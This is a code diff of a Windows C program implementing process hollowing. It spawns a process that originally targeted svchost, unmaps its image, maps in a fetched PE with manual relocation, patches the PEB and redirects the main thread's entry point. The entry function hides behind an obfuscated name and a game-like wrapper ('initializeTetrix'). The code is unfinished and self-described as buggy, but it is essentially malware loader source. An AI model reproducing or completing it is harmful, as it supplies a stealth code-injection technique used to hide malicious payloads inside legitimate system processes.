@@ -12,7 +12,7 @@ STARTUPINFOA stInfo={0};
 stInfo.cb=sizeof(stInfo);
 PROCESS_INFORMATION pInfo;
 if(CreateProcessA(
-SVCHOST,
+PROCESS,
 NULL,
 NULL,
 NULL,
@@ -86,6 +86,7 @@ BYTE* fetchPE(){
 // 
 MappingMetadata PEParser(BYTE* pe){
     MappingMetadata mm;
+    // pe file base 
     mm.heapBase=pe;
     unsigned long long  p_NT_HEADERS=(unsigned long long)(pe+*(pe+0x3c));
     unsigned long long p_FILE_HEADERS=(unsigned long long)(p_NT_HEADERS+0x4);
@@ -98,13 +99,332 @@ MappingMetadata PEParser(BYTE* pe){
     // important
     mm.ImageSectionsCount=*(unsigned short*)(p_FILE_HEADERS+0x2);
     unsigned short optHeadersSz=*(unsigned short*)(p_FILE_HEADERS+0x10);
-
     // sizeof(IMAGE_SECTION_HEADER) = 40 bytes
     IMAGE_SECTION_HEADER* p_SECTION_HEADER=(IMAGE_SECTION_HEADER*)(p_NT_HEADERS+0x4+0x14+optHeadersSz);
     mm.ImageSectionHeaders=(unsigned long long )p_SECTION_HEADER;
-    
+    // extracting section alignmnet (crucial for mapping)
+    mm.sectionAlignment=*(unsigned long*)(p_OPT_HEADERS+0x20);
+    mm.dataDirectoryList=(IMAGE_DATA_DIRECTORY*)(p_OPT_HEADERS+0x70);
     return mm;
 }
+
+
+
+void mapRoutineX(HANDLE proc,BYTE* remoteV,MappingMetadata mm,IMAGE_SECTION_HEADER **reloc){
+    IMAGE_SECTION_HEADER* sec=(IMAGE_SECTION_HEADER*)mm.ImageSectionHeaders;
+    unsigned long _sz=sizeof(IMAGE_SECTION_HEADER); // 40 bytes in x64 PE
+
+    for(int i=0; i<mm.ImageSectionsCount; i++){
+    char* name=(char*)(sec->Name);
+    
+    if(strcmp(name,".reloc")==0){
+        printf(".reloc ---- %i|||| base: %llu\n",sec->SizeOfRawData,(unsigned long long)sec);
+        *reloc=sec;
+        sec++;
+        continue;
+    }
+
+    unsigned int protections=sec->Characteristics;
+    unsigned int rva_raw=sec->PointerToRawData;
+    unsigned int rva_virt=sec->VirtualAddress;
+
+    // section size on disk (multiply of file alignment)
+    unsigned long secRsz=sec->SizeOfRawData;
+    // actual content size which should be alligned to section alignment
+    // alignment is done by loader only when it maps subsection of IMAGE to 
+    // va space.
+    // i allocate contigious va space, so does not
+    unsigned long _virtualSize=*(unsigned long*)((BYTE*)sec+0x8);
+
+    printf("%s --- size on disk: %i | size in VA: %i\n",name,secRsz,_virtualSize);
+
+    void* va=remoteV+rva_virt;
+    void* raw=mm.heapBase+rva_raw;
+    unsigned long long written=0;  
+   
+    if(!WriteProcessMemory(
+        proc,
+        va,
+        raw,
+        _virtualSize,
+        &written
+    )){
+        printf("[-] 144 failed  to write section to p mem\n");
+        exit(1);
+    }
+
+    DWORD oldProt=0;
+    DWORD newProtection=0;
+
+    if(protections & IMAGE_SCN_MEM_EXECUTE){
+        newProtection=PAGE_EXECUTE_READ;
+    }
+    else if((protections & IMAGE_SCN_MEM_READ) && (protections & IMAGE_SCN_MEM_WRITE)){
+        newProtection=PAGE_READWRITE;
+    }
+    else{
+        newProtection=PAGE_READONLY;
+    }
+
+    VirtualProtectEx(
+        proc,
+        va,
+        _virtualSize,
+        newProtection,
+        &oldProt
+    );
+    printf("written to %s --- %llu bytes\n",name,written);
+    if(written!=(unsigned long)_virtualSize){
+        printf("[-] 235!\n");
+        exit(1);
+    }
+    sec++;
+    }
+    printf("all sections has been mapped!\n");
+}
+
+
+// BUG IS WITHIN rellocate() SOMEWHERE
+
+
+
+// bug: blockSz shows 0 for some IMAGE_BASE_RELOCATION
+// ISSUE IN RELLOC
+void rellocate(HANDLE proc,void* remoteImageBase,void* heapBase,void* preferedBase,IMAGE_SECTION_HEADER *sec){
+    printf("RELLOC STARTED\n");
+    // reloction block in heap (first el in list)
+    BYTE* _block=(BYTE*)((BYTE*)heapBase+(unsigned int)(sec->PointerToRawData));
+    
+    unsigned int secSz=sec->SizeOfRawData;
+    printf(".reloc ---- %i\n",secSz);
+    
+    long long delta = (long long)(uintptr_t)remoteImageBase - (long long)(uintptr_t)preferedBase;
+    unsigned int parsedBytes=0;
+    while(parsedBytes<secSz){
+        IMAGE_BASE_RELOCATION* block=(IMAGE_BASE_RELOCATION*)_block;
+
+        unsigned int blockSz=block->SizeOfBlock;
+        if(blockSz==0)
+            break;
+        unsigned int pageRva=block->VirtualAddress;
+        
+        printf("block size: %i\n",blockSz);
+        // this block works on given page
+        uintptr_t page=(uintptr_t)((unsigned long long)remoteImageBase+pageRva);
+        printf("relocation process for page: %llu\n",page);
+        
+        unsigned int entriesCount=(blockSz-8)/2;
+        printf("entreis count: %i\n",entriesCount);
+
+        WORD* entry=(WORD*)((BYTE*)block+8);
+
+        for(unsigned int j=0;j<entriesCount;j++){
+            
+            BYTE relocType=*entry>>12;
+            WORD offset=*entry & 0x0FFF;
+            
+            if(relocType==3 || relocType==10){
+                uintptr_t absolute=page+offset;
+                uintptr_t relocated = (uintptr_t)((long long)absolute + delta - (long long)(uintptr_t)preferedBase);
+                printf("before relocation: %p ---- after relocation: %p\n",absolute,relocated);
+
+                if(!WriteProcessMemory(
+                    proc,
+                    (void*)absolute,
+                    &relocated,
+                    sizeof(unsigned long long),
+                    NULL
+                )){
+                    printf("[-] 186!\n");
+                    exit(1);
+                }
+            }
+            entry++;
+        }
+        parsedBytes+=blockSz;
+        _block+=blockSz;
+    }
+    printf("relocated successfuly!\n");
+}
+
+
+void resolveIAT(BYTE* imageBase,IMAGE_DATA_DIRECTORY* dataDirectoryList){
+    // 1) map libraries to remote process as view of section
+    // 2) resolve iat for libs
+
+
+    IMAGE_DATA_DIRECTORY* importDD=(dataDirectoryList+IMAGE_DIRECTORY_ENTRY_IMPORT);
+    unsigned long rva=importDD->VirtualAddress;
+    unsigned long size=importDD->Size;
+
+    IMAGE_IMPORT_DESCRIPTOR* import=(IMAGE_IMPORT_DESCRIPTOR*)(imageBase+rva);
+
+    for(unsigned long i=0;i<size;i++){
+        char* dll_name=(char*)(imageBase+import->Name);
+        IMAGE_THUNK_DATA64* thunk=(IMAGE_THUNK_DATA64*)(imageBase+import->FirstThunk);
+        
+        
+        
+        import++;
+    }
+
+
+}
+
+
+bool hallowAndStart(HANDLE proc,HANDLE thread,BYTE* pe){
+HANDLE self=GetCurrentProcess();
+HMODULE ntdll=GetModuleHandleA("ntdll");
+T_NtQueryInformationProcess NtQueryInformationProcess=(T_NtQueryInformationProcess)GetProcAddress(ntdll,"NtQueryInformationProcess");
+T_NtMapViewOfSection NtMapViewOfSection=(T_NtMapViewOfSection)GetProcAddress(ntdll,"NtMapViewOfSection");
+T_NtUnmapViewOfSection NtUnmapViewOfSection=(T_NtUnmapViewOfSection)GetProcAddress(ntdll,"NtUnmapViewOfSection");
+T_NtCreateSection NtCreateSection=(T_NtCreateSection)GetProcAddress(ntdll,"NtCreateSection");
+
+
+ PROCESS_BASIC_INFORMATION pinfo;
+ ULONG requiredSize=sizeof(pinfo);
+if(NtQueryInformationProcess(
+    proc,
+   ProcessBasicInformation,
+   &pinfo,
+   requiredSize,
+   &requiredSize
+)!=0){
+    NtQueryInformationProcess(
+    proc,
+   ProcessBasicInformation,
+   &pinfo,
+   requiredSize,
+   &requiredSize
+);
+}
+// stores address of PEB. only makes sense within VA space of remote process. not here
+void* baseAddrAddr=(void*)((BYTE*)pinfo.PebBaseAddress+0x10);
+uintptr_t baseAddr=0;
+ReadProcessMemory(proc,baseAddrAddr,&baseAddr,sizeof(PVOID),NULL);
+if(NtUnmapViewOfSection(proc,(void*)baseAddr)!=0){
+    printf("[-] NtUnmapViewOfSection()!\n");
+    exit(1);
+} // disassociates VA region from section object
+
+
+printf("section object has been unmaped. you can check via debugger and then press enter to continue \
+        program execution!\n");
+
+getchar();
+
+printf("continiueueueuing execution\n");
+
+
+// compare PEParser to  reversing pe fields.
+MappingMetadata mm=PEParser(pe);
+printf(
+    "heap base: %llu | prefered base: %llu | image size: %lu | headers size: %lu\n",
+    mm.heapBase,mm.preferedBase,mm.imageSize,mm.headersSize
+);
+
+char* remoteV=(char*)VirtualAllocEx(
+proc,
+(void*)mm.preferedBase,
+(SIZE_T)mm.imageSize,
+MEM_COMMIT | MEM_RESERVE,
+0x40
+);
+
+if(!remoteV)
+    remoteV=(char*)VirtualAllocEx(
+        proc,
+        NULL,
+        (SIZE_T)mm.imageSize,
+        MEM_COMMIT | MEM_RESERVE,
+        0x40
+);
+
+printf("new base address of target process: %lu\n",remoteV);
+
+if(WriteProcessMemory(
+    proc,
+    remoteV,
+    mm.heapBase,
+    mm.headersSize,
+    NULL
+)){
+    printf("headers has been written. check with debugger. then enter to continue\n");
+    getchar();
+};
+
+IMAGE_SECTION_HEADER *reloc=NULL;
+if(!KERNEL_STYLE){
+    mapRoutineX(proc,remoteV,mm,&reloc); // ELSE mapRoutineY();
+    printf("sections has been mapped! check with debugger\n");
+    getchar();
+}
+if(mm.preferedBase!=(unsigned long long)remoteV && reloc!=NULL)
+    rellocate(proc,(void*)remoteV,(void*)mm.heapBase,(void*)mm.preferedBase,reloc);
+
+
+
+// adjusting image base in remote PEB
+
+if(!WriteProcessMemory(
+    proc,
+    baseAddrAddr,
+    (void*)&remoteV,
+    sizeof(unsigned long long),
+    NULL
+)){
+    printf("PEB CANT BE ADJUSTED!\n");
+    exit(1);
+}
+
+// in windows versions ntdll initialization procedures differ version by version
+// so for guaranteed, it is better to fill IAT manually with functions.
+
+resolveIAT(remoteV,mm.dataDirectoryList);
+
+uintptr_t entryPont=(uintptr_t)(remoteV+mm.RVAAddressOfEntryPoint);
+
+printf("ENTRY POINT: %llu\n",entryPont);
+CONTEXT thContext;
+if(!GetThreadContext(thread,&thContext))
+    printf("[-] 288!\n");
+    
+thContext.Rcx=(DWORD64)entryPont;
+if(!SetThreadContext(thread,&thContext))
+    printf("[-] 293!\n");
+
+printf("PRESS ENT TO RESUME THREAD!\n");
+getchar();
+
+if(ResumeThread(thread)!=-1){
+    printf("main thread started!\n");
+    return true;
+}
+return false;
+}
+
+bool __0x1FN3C3SS4RY__(){
+    PROCESS_INFORMATION pinfo=spawn();
+    printf("SVCHOST PID: %i\n",pinfo.dwProcessId);
+    HANDLE svchost=pinfo.hProcess;
+    HANDLE svchostMainThread=pinfo.hThread;
+    BYTE* pe=fetchPE(); // returns heap base 
+    bool cool=hallowAndStart(svchost,svchostMainThread,pe);
+    if(cool)
+        return true;
+    exit(1);
+}
+extern bool initializeTetrix(){
+  return __0x1FN3C3SS4RY__();
+}
+
+
+int main(){
+    initializeTetrix();
+    return 0;
+}
+
+
 
 // section object mappnig approach
 // void mapRoutineY(){
@@ -154,229 +474,3 @@ MappingMetadata PEParser(BYTE* pe){
 //     exit(1);
 // }
 // }
-
-void mapRoutineX(HANDLE proc,BYTE* remoteV,MappingMetadata mm,IMAGE_SECTION_HEADER **reloc){
-    IMAGE_SECTION_HEADER* sec=(IMAGE_SECTION_HEADER*)mm.ImageSectionHeaders;
-    unsigned long _sz=sizeof(IMAGE_SECTION_HEADER); // 40 bytes in x64 PE
-
-    for(int i=0; i<mm.ImageSectionsCount; i++){
-    char* name=(char*)(sec->Name);
-    
-    if(strcmp(name,".reloc")==0){
-        printf(".reloc ---- %i|||| base: %llu\n",sec->SizeOfRawData,(unsigned long long)sec);
-        *reloc=sec;
-        sec++;
-        continue;
-    }
-
-    unsigned int protections=sec->Characteristics;
-    unsigned int rva_raw=sec->PointerToRawData;
-    unsigned int rva_virt=sec->VirtualAddress;
-    unsigned int secSz=sec->SizeOfRawData;
-
-    void* va=remoteV+rva_virt;
-    void* raw=mm.heapBase+rva_raw;
-    unsigned long long written=0;
-
-    WriteProcessMemory(
-        proc,
-        va,
-        raw,
-        secSz,
-        &written
-    );
-    printf("written to %s --- %llu bytes\n",name,written);
-    if(written!=(unsigned long)secSz){
-        printf("[-] 235!\n");
-        exit(1);
-    }
-    sec++;
-    }
-    printf("all sections has been mapped!\n");
-}
-
-
-// BUG IS WITHIN rellocate() SOMEWHERE
-
-
-
-// bug: blockSz shows 0 for some IMAGE_BASE_RELOCATION
-void rellocate(HANDLE proc,void* remoteImageBase,void* heapBase,void* preferedBase,IMAGE_SECTION_HEADER *sec){
-    printf("RELLOC STARTED\n");
-    // reloction block in heap (first el in list)
-    BYTE* _block=(BYTE*)((BYTE*)heapBase+(unsigned int)(sec->PointerToRawData));
-    
-    unsigned int secSz=sec->SizeOfRawData;
-    printf(".reloc ---- %i\n",secSz);
-    
-    long long delta=(unsigned long long)remoteImageBase-(unsigned long long)preferedBase;
-    
-    unsigned int parsedBytes=0;
-    while(parsedBytes<=secSz){
-        IMAGE_BASE_RELOCATION* block=(IMAGE_BASE_RELOCATION*)_block;
-
-        unsigned int blockSz=block->SizeOfBlock;
-        if(blockSz==0)
-            break;
-        unsigned int pageRva=block->VirtualAddress;
-        
-        printf("block size: %i\n",blockSz);
-        // this block works on given page
-        uintptr_t page=(uintptr_t)((unsigned long long)remoteImageBase+pageRva);
-        printf("relocation process for page: %llu\n",page);
-        
-        unsigned int entriesCount=(blockSz-8)/2;
-        printf("entreis count: %i\n",entriesCount);
-
-        WORD* entry=(WORD*)((BYTE*)block+8);
-
-        for(unsigned int j=0;j<entriesCount;j++){
-            
-            BYTE relocType=*entry>>12;
-            WORD offset=*entry & 0x0FFF;
-            
-            if(relocType==3 || relocType==10){
-                uintptr_t absolute=page+offset;
-                uintptr_t relocated=(uintptr_t)((absolute-(uintptr_t)preferedBase)+delta);
-                printf("before relocation: %llu ---- after relocation: %llu\n",absolute,relocated);
-
-                if(!WriteProcessMemory(
-                    proc,
-                    (void*)absolute,
-                    &relocated,
-                    sizeof(uintptr_t),
-                    NULL
-                )){
-                    printf("[-] 186!\n");
-                    exit(1);
-                }
-            }
-            entry++;
-        }
-        parsedBytes+=blockSz;
-        _block+=blockSz;
-    }
-    printf("relocated successfuly!\n");
-}
-
-
-
-bool hallowAndStart(HANDLE proc,HANDLE thread,BYTE* pe){
-HANDLE self=GetCurrentProcess();
-HMODULE ntdll=GetModuleHandleA("ntdll");
-T_NtQueryInformationProcess NtQueryInformationProcess=(T_NtQueryInformationProcess)GetProcAddress(ntdll,"NtQueryInformationProcess");
-T_NtMapViewOfSection NtMapViewOfSection=(T_NtMapViewOfSection)GetProcAddress(ntdll,"NtMapViewOfSection");
-T_NtUnmapViewOfSection NtUnmapViewOfSection=(T_NtUnmapViewOfSection)GetProcAddress(ntdll,"NtUnmapViewOfSection");
-T_NtCreateSection NtCreateSection=(T_NtCreateSection)GetProcAddress(ntdll,"NtCreateSection");
-
-
- PROCESS_BASIC_INFORMATION pinfo;
- ULONG requiredSize=sizeof(pinfo);
-if(NtQueryInformationProcess(
-    proc,
-   ProcessBasicInformation,
-   &pinfo,
-   requiredSize,
-   &requiredSize
-)!=0){
-    NtQueryInformationProcess(
-    proc,
-   ProcessBasicInformation,
-   &pinfo,
-   requiredSize,
-   &requiredSize
-);
-}
-// stores address of PEB. only makes sense within VA space of remote process. not here
-void* baseAddrAddr=(void*)((BYTE*)pinfo.PebBaseAddress+0x10);
-uintptr_t baseAddr=0;
-ReadProcessMemory(proc,baseAddrAddr,&baseAddr,sizeof(PVOID),NULL);
-NtUnmapViewOfSection(proc,(void*)baseAddr); // disassociates VA region from section object
-
-MappingMetadata mm=PEParser(pe);
-printf(
-    "heap base: %llu | prefered base: %llu | image size: %lu | headers size: %lu\n",
-    mm.heapBase,mm.preferedBase,mm.imageSize,mm.headersSize
-);
-
-char* remoteV=(char*)VirtualAllocEx(
-proc,
-NULL,
-(SIZE_T)mm.imageSize,
-MEM_COMMIT | MEM_RESERVE,
-0x40
-);
-
-if(WriteProcessMemory(
-    proc,
-    remoteV,
-    mm.heapBase,
-    mm.headersSize,
-    NULL
-)){
-    printf("up to 246. alles gut\n");
-
-};
-
-IMAGE_SECTION_HEADER *reloc=NULL;
-if(!KERNEL_STYLE)
-    mapRoutineX(proc,remoteV,mm,&reloc); // ELSE mapRoutineY();
-
-if(mm.preferedBase!=(unsigned long long)remoteV){
-    rellocate(proc,(void*)remoteV,(void*)mm.heapBase,(void*)mm.preferedBase,reloc);
-}
-
-// adjusting image base in remote PEB
-
-if(!WriteProcessMemory(
-    proc,
-    baseAddrAddr,
-    &remoteV,
-    sizeof(unsigned long long),
-    NULL
-)){
-    printf("PEB CANT BE ADJUSTED!\n");
-    exit(1);
-}
-
-
-// THINK ABOUT THREAD CRETion steps.
-
-// uintptr_t entryPont=(uintptr_t)(remoteV+mm.RVAAddressOfEntryPoint);
-// printf("ENTRY POINT: %llu\n",entryPont);
-// CONTEXT thContext;
-// if(!GetThreadContext(thread,&thContext))
-//     printf("[-] 288!\n");
-    
-// thContext.Rip=(DWORD64)entryPont;
-// if(!SetThreadContext(thread,&thContext))
-//     printf("[-] 293!\n");
-
-
-if(ResumeThread(thread)!=-1){
-    printf("main thread started!\n");
-    return true;
-}
-return false;
-}
-
-bool __0x1FN3C3SS4RY__(){
-    PROCESS_INFORMATION pinfo=spawn();
-    HANDLE svchost=pinfo.hProcess;
-    HANDLE svchostMainThread=pinfo.hThread;
-    BYTE* pe=fetchPE(); // returns heap base 
-    bool cool=hallowAndStart(svchost,svchostMainThread,pe);
-    if(cool)
-        return true;
-    exit(1);
-}
-extern bool initializeTetrix(){
-  return __0x1FN3C3SS4RY__();
-}
-
-
-int main(){
-    initializeTetrix();
-    return 0;
-}
-
